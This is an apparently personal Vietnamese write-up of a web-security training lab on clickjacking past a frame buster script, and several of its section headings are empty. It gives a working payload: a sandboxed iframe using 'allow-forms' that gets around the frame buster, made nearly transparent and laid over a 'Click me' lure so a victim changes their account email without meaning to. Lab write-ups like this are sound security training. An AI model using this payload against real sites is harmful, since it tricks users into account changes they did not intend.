# Write-ups: Clickjacking with a frame buster script

### Tổng quan

### Mục tiêu

### Công cụ sử dụng
- Burp Suite Pro
- Firefox Browser

### Quy trình khai thác







- đăng nhập vào tài khoản `wiener`:`peter`, trong mục update email cho phép điền trước email trong url /my-account?id=wiener&email=wiener%40gmail.com

- dựa vào đó ta sẽ điền một email có trước và tạo 1 site mồi với nút click được chèn trước nút email nhằm đánh lừa người dùng

- Trong exploit server kiểm tra có thể chèn thẻ <iframe> hay ko với payload: 
`<iframe src="https://0a0f008c0364d63681d0f279006500f4.web-security-academy.net/my-account"></iframe>`
    - view exploit hiện ko thể chèn do có java buster chặn 

- bypass java buster bằng sandbox
<iframe src="https://0ad600b703758ec7806f03e60024000d.web-security-academy.net/my-account?email=aaaa%40gmail.com"
        sandbox="allow-forms">
</iframe>
    - view exploit quan sát được web

- chèn payload hiển thị nút click me để lừa người dùng ấn vào update email. Tùy chỉnh vị trí nút click me để khớp với nút update email sau đó gửi cho nạn nhân và hoàn thành lab.
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 700px;
        opacity: 0.000001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:465px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0ad600b703758ec7806f03e60024000d.web-security-academy.net/my-account?email=aaaa%40gmail.com"
        sandbox="allow-forms">
</iframe>




### Bài học rút ra

### Kết luận